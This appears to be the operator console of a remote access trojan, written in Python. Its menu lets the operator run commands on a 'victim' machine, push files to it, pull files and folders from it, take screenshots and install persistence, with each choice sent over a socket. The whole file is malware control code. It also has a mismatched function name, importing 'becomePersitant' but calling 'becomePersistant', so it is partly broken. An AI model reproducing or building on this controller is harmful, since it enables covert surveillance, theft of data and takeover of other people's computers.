from core.command import runCommand
from core.fileupload import uploadFiles
from core.fileFolderDownloader import receiveFileFolders
from core.screenshot import captureScreenshot
from core.persistance import becomePersitant


def showOptions():
    print("\n")
    print("[ 01 ] Run command on victim OS")
    print("[ 02 ] Upload file to victim")
    print("[ 03 ] Download files and folders")
    print("[ 04 ] Change directory")
    print("[ 05 ] Capture Screenshot")
    print("[ 06 ] Become Persistant")
    print("[ 99 ] Exit")


def handleConnection(my_socket):
    print("[+] Handling connection")

    while True:
        showOptions()
        user_input = input("[+] Select your options : ")
        my_socket.sendData(user_input)

        if user_input == "1":
            print("[+] Running the commands on victim")
            # Create function to handle command execution
            runCommand(my_socket)
        elif user_input == "2":
            print("[+] Uploading files")
            uploadFiles(my_socket)
        elif user_input == "3":
            receiveFileFolders(my_socket)
        elif user_input == "4":
            my_socket.changeDirectory()
        elif user_input == "5":
            captureScreenshot(my_socket)
        elif user_input == "6":
            becomePersistant(my_socket)
        elif user_input == "99":
            break
        else:
            print("[+] Invalid input")
            break